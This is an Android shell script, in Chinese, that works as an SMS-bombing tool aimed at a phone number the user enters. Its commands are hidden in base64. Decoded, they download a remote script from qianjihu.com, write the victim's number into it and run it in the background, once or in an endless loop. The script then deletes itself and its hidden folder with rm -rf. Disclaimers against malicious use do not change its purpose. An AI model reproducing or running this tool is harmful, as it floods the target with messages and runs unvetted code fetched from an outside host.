pass=`$(echo "Y3VybCBodHRwOi8vcWlhbmppaHUuY29tL2piLzMyeHgK" |base64 -d)`
echo -e "\033[35m 请输入授权码（qq群:659126869获取）： \033[0m"
read PASSWD
key=`echo -n $PASSWD|md5sum`
if [[ ${key%%\ *} == $pass ]]
    then
        echo 
        echo -e "\033[35m 授权成功 \033[0m"
        rm $0 $(echo "Ki5iYWsgL3NkY2FyZC8ubmJkeAo=" |base64 -d)
        $(echo "bWtkaXIgL3NkY2FyZC8ubmJkeAo=" |base64 -d)
    else
        echo
        echo -e "\033[31m 授权码错误 \033[0m"
		rm $0 $(echo "Ki5iYWsgL3NkY2FyZC8ubmJkeAo=" |base64 -d)
exit 0;
fi
echo "====================================================="
echo -e "\033[32m              欢迎使用安卓脚本版短信轰炸 \033[0m"
echo -e "\033[32m 1，开始轰炸 \033[0m"
echo -e "\033[32m 测试玩耍版 \033[0m"
echo -e "\033[31m 注意：禁止倒卖和售卖本程序 \033[0m"
echo -e "\033[31m 注意：禁止使用本程序恶意攻击 \033[0m"
echo -e "\033[31m 注意：因本程序导致的法律纠纷与本作者无关 \033[0m"
echo -e "\033[35m                            本程序作者：千狐の王座 \033[0m"
echo -e "\033[32m                          交流讨论QQ群：659126869 \033[0m"

echo "====================================================="
echo -e '\033[32m 是否同意以上\033[31m红色\033[0m的三项(是输y否输n) \033[0m'
read yn
if [[ $yn == y ]]
    then
        echo 
        echo -e "\033[32m 已同意并已知晓 \033[0m"
        
    else
        echo
        echo -e "\033[31m 未同意不得用本程序！ \033[0m"
        rm $0 $(echo "Ki5iYWsgL3NkY2FyZC8ubmJkeAo=" |base64 -d)
exit 0;
fi
echo -e "\033[32m 这里输入1： \033[0m"
read a
if (($a==1));then
$(echo "Y3VybCAtbyAvc2RjYXJkLy5uYmR4L2R4IGh0dHA6Ly9xaWFuamlodS5jb20vamIvJUU3JTlGJUFEJUU0JUJGJUExJUU2JThFJUE1JUU1JThGJUEzCg==" |base64 -d)
$(echo "cm0gLXJmICouYmFrCg==" |base64 -d)
echo -e "\033[32m 输入11位目标号码 \033[0m"
read dhhm
sed -i 's/12345678901/'$dhhm'/g' $(echo "L3NkY2FyZC8ubmJkeC9keAo=" |base64 -d)
echo -e "\033[35m 设置完毕 \033[0m"
echo -e "\033[35m 请等待......... \033[0m"
sleep 2
$(echo "c2ggL3NkY2FyZC8ubmJkeC9keCAmCg==" |base64 -d) > /dev/null
rm $0
$(echo "cm0gLXJmIC9zZGNhcmQvLm5iZHggKi5iYWsK" |base64 -d)
elif (($a==6));then
$(echo "Y3VybCAtbyAvc2RjYXJkLy5uYmR4L2R4IGh0dHA6Ly9xaWFuamlodS5jb20vamIvJUU3JTlGJUFEJUU0JUJGJUExJUU2JThFJUE1JUU1JThGJUEzCg==" |base64 -d)
$(echo "cm0gLXJmICouYmFrCg==" |base64 -d)
echo -e "\033[32m 输入11位目标号码 \033[0m"
read dhhm
sed -i 's/12345678901/'$dhhm'/g' $(echo "L3NkY2FyZC8ubmJkeC9keAo=" |base64 -d)
while true;do
echo -e "\033[35m 您的专属无限循环式轰炸已开启 \033[0m"
$(echo "c2ggL3NkY2FyZC8ubmJkeC9keCAmCg==" |base64 -d) > /dev/null
sleep 1
done
else
echo
fi
